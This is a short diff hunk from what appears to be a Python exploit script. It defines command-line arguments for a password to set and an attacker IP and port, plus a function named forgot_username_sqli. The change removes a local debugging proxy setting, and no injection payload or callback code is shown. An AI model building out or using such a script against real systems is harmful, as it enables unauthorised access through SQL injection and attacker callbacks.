@@ -9,10 +9,6 @@ parser.add_argument('-p','--password', help='Password to set', required=True)
 parser.add_argument('-i','--ip', help='Attacker IP', required=True)
 parser.add_argument('-pt','--port', help='Attacker port', required=True)
 args = parser.parse_args()
-http_proxy = "http://127.0.0.1:8080"
-proxyDict = {
-            "http" : http_proxy
-        }
 s = requests.session()
 
 def forgot_username_sqli(target, inj_str):
